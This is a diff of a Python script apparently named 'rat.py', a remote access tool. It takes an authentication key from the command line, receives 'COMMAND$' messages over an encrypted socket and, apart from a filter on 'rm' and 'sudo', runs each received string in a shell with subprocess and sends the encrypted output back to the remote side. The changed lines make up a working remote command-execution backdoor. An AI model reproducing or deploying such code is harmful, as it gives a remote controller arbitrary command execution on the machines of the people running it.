@@ -5,9 +5,9 @@ import sys, os, socket, select, time, datetime, getpass, base64, subprocess
 from Crypto import Random
 from Crypto.Cipher import AES
 
-#if (len(sys.argv) < 3):
-#    print("Usage: python connector.py <host> <port>")
-#    sys.exit(0)
+if (len(sys.argv) < 2):
+    print("Usage: sudo python rat.py <key>")
+    sys.exit(0)
 
 # Vars
 host = ''
@@ -15,7 +15,9 @@ port = 3435
 
 #host = raw_input('IP \> ')
 #port = input('Port \> ')
-_key = raw_input('Authentication Key \> ')
+#_key = raw_input('Authentication Key \> ')
+
+_key = sys.argv[1]
 
 BS = 256
 pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
@@ -94,10 +96,14 @@ def connector():
                 # Do something when some data is present
                 if 'COMMAND$' in data:
                     # Run command
-                    if not data.split('$')[1].startswith('rm') or data.split('$')[1].startswith('sudo rm'):
-                        os.system(data.split('$')[1])
-                    else:
+                    if data.split('$')[1].startswith('rm'):
                         print('\033[1;94m[ INFO ]\033[0m Commanded Blocked: %s' % data.split('$')[1])
+                    elif 'sudo' in data.split('$')[1]:
+                        print('\033[1;94m[ INFO ]\033[0m Commanded Blocked: %s' % data.split('$')[1])
+                    else:
+                        #os.system(data.split('$')[1])
+                        CMD = subprocess.check_output(data.split('$')[1], shell=True)
+                        server.send(cipher.encrypt(CMD))
 
                 elif 'SHUTDOWN$' in data:
                     if data.split('$')[1] == _key:
